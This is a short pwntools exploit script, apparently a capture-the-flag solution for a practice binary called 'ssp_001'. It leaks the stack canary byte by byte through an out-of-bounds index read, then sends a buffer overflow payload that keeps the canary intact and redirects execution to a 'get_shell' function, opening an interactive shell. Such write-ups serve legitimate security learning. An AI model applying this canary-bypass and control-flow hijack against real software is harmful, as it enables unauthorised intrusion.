from pwn import *

if args.REMOTE:
    io = remote(sys.argv[1],sys.argv[2])
else:
    io = process("./ssp_001", )

elf = context.binary = ELF("./ssp_001", checksec=False)
rop = ROP(elf)
context.log_level = 'info'

offset = 64 #canary
pause()
canary = ''
io.recvuntil(b'> ')
io.sendline(b'P')
io.recvuntil(b'Element index : ')
io.sendline(b'131')
io.recvuntil(b'is : ')
canary += str(io.recv(2).decode())

io.recvuntil(b'> ')
io.sendline(b'P')
io.recvuntil(b'Element index : ')
io.sendline(b'130')
io.recvuntil(b'is : ')
canary += str(io.recv(2).decode())

io.recvuntil(b'> ')
io.sendline(b'P')
io.recvuntil(b'Element index : ')
io.sendline(b'129')
io.recvuntil(b'is : ')
canary += str(io.recv(2).decode())

io.recvuntil(b'> ')
io.sendline(b'P')
io.recvuntil(b'Element index : ')
io.sendline(b'128')
io.recvuntil(b'is : ')
canary += str(io.recv(2).decode())

# log.info("Canary: " + canary)
# address canary 0xffffceb0


canary = int(canary, 16)

log.info("Canary Hex: " + hex(canary))


payload = b'A'*offset + p32(canary) +b'A'*8 + p32(elf.sym['get_shell'])



io.recvuntil(b'> ')
io.sendline(b'E')
io.recvuntil(b' : ')
io.sendline(str(1000))
io.sendline(payload)
io.interactive()